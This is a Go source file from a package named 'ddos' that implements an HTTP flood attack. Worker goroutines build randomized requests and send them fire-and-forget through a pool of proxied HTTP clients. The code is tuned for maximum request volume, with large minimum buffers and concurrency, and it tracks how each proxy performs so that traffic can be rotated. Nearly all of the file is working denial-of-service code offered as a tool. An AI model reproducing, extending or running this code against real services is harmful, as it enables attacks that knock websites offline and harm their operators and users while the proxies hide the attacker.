package ddos

import (
	"net/http"
	"sync/atomic"
	"time"
)

// startFloodAttack starts HTTP flood attack
func (d *DDoSAttack) startFloodAttack() {
	d.startFloodWorkers(d.config.MaxThreads)
}

// startFloodWorkers starts specified number of flood workers
// Always uses connection pool and fire-and-forget for maximum efficiency
func (d *DDoSAttack) startFloodWorkers(numWorkers int) {
	// Always use connection pool (required for efficiency)
	pool, err := NewClientPool(d.config)
	if err != nil {
		// If pool creation fails, we can't proceed efficiently
		return
	}
	d.clientPool = pool

	// Create request builder (always enabled with randomization)
	if d.requestBuilder == nil {
		d.requestBuilder = NewRequestBuilder(d.config)
	}

	// Start workers - always use continuous fire-and-forget (maximum efficiency)
	for i := 0; i < numWorkers; i++ {
		d.wg.Add(1)
		go d.continuousFireAndForgetWorker(pool)
	}
}

// continuousFireAndForgetWorker sends requests continuously without waiting (maximum efficiency)
func (d *DDoSAttack) continuousFireAndForgetWorker(pool *ClientPool) {
	defer func() {
		// Recover from panics to prevent worker crashes
		if r := recover(); r != nil {
			atomic.AddInt64(&d.requestsFailed, 1)
		}
		d.wg.Done()
	}()

	// Create async sender for this worker with proxy tracking
	// Retry getting client if pool is temporarily empty
	var client *http.Client
	for i := 0; i < 10; i++ {
		client = pool.GetClient()
		if client != nil {
			break
		}
		// Small delay before retry
		select {
		case <-d.ctx.Done():
			return
		case <-time.After(10 * time.Millisecond):
		}
	}
	if client == nil {
		// Pool has no clients - this shouldn't happen but handle gracefully
		atomic.AddInt64(&d.requestsFailed, 1)
		return
	}
	proxyURL := pool.GetProxyForClient(client)
	// Dynamic goroutine limit: MaxThreads * 10 for better throughput
	maxConcurrent := d.config.MaxThreads * 10
	if maxConcurrent < 1000 {
		maxConcurrent = 1000 // Minimum for high-throughput
	}
	asyncSender := NewAsyncSenderWithProxyAndLimit(
		client,
		proxyURL,
		func(proxy string, rt time.Duration) {
			d.markProxySuccess(proxy, rt)
		},
		func(proxy string) {
			d.markProxyFailure(proxy)
		},
		maxConcurrent,
	)
	// Set callbacks for main attack stats tracking
	asyncSender.SetStatsCallbacks(
		func() {
			atomic.AddInt64(&d.requestsSuccess, 1)
		},
		func() {
			atomic.AddInt64(&d.requestsFailed, 1)
		},
	)
	defer asyncSender.Close() // Ensure cleanup

	// Buffered channel for requests (non-blocking) - dynamic size based on MaxThreads
	// Use MaxThreads * 5 for better throughput without blocking
	channelBuffer := d.config.MaxThreads * 5
	if channelBuffer < 5000 {
		channelBuffer = 5000 // Minimum buffer size
	}
	requestChan := make(chan *http.Request, channelBuffer)

	// Producer: continuously build requests
	producerDone := make(chan struct{})
	go func() {
		defer func() {
			// Safely close channels
			select {
			case <-producerDone:
				// Already closed
			default:
				close(producerDone)
			}
			// Recover from panics in producer
			if r := recover(); r != nil {
				atomic.AddInt64(&d.requestsFailed, 1)
			}
		}()
		
		// Ensure requestBuilder is initialized
		if d.requestBuilder == nil {
			d.requestBuilder = NewRequestBuilder(d.config)
		}
		
		// Safe type assertion
		rb, ok := d.requestBuilder.(*RequestBuilder)
		if !ok || rb == nil {
			// Request builder not initialized - this is a critical error
			atomic.AddInt64(&d.requestsFailed, 1)
			return
		}
		
		// Producer loop: continuously build and send requests
		for {
			select {
			case <-d.ctx.Done():
				return
			default:
				// Build request - retry on error
				req, err := rb.BuildRequest()
				if err != nil {
					atomic.AddInt64(&d.requestsFailed, 1)
					// Small delay on error to prevent tight error loop
					select {
					case <-d.ctx.Done():
						return
					case <-time.After(1 * time.Millisecond):
					}
					continue
				}
				
				if req == nil {
					atomic.AddInt64(&d.requestsFailed, 1)
					continue
				}
				
				req = req.WithContext(d.ctx)

				// Try to send request to channel (non-blocking)
				select {
				case requestChan <- req:
					// Successfully queued request
				case <-d.ctx.Done():
					return
				default:
					// Channel full - this shouldn't happen often with large buffer
					// But if it does, we'll skip this request and try again
					atomic.AddInt64(&d.requestsFailed, 1)
					// Small delay to let consumer catch up
					select {
					case <-d.ctx.Done():
						return
					case <-time.After(1 * time.Millisecond):
					}
				}
			}
		}
	}()

	// Consumer: send requests asynchronously (fire-and-forget)
	for {
		select {
		case <-d.ctx.Done():
			// Wait for producer to finish (with timeout to prevent hanging)
			select {
			case <-producerDone:
			case <-time.After(5 * time.Second):
				// Timeout waiting for producer
			}
			return
		case req, ok := <-requestChan:
			if !ok {
				// Channel closed, producer done
				return
			}
			if req == nil {
				// Skip nil requests
				continue
			}
			// Rate limiting: check if request is allowed
			if d.rateLimiter != nil && !d.rateLimiter.Allow() {
				// Rate limit exceeded, skip this request
				atomic.AddInt64(&d.requestsFailed, 1)
				continue
			}
			atomic.AddInt64(&d.requestsSent, 1)
			atomic.AddInt64(&d.activeConns, 1)
			// Always skip response reading for maximum efficiency
			// Note: success/failure is tracked in async sender callbacks
			asyncSender.SendAsync(req, true)
			// Don't increment success here - it's tracked asynchronously
			// The async sender will handle success/failure via callbacks
			atomic.AddInt64(&d.activeConns, -1)
		}
	}
}


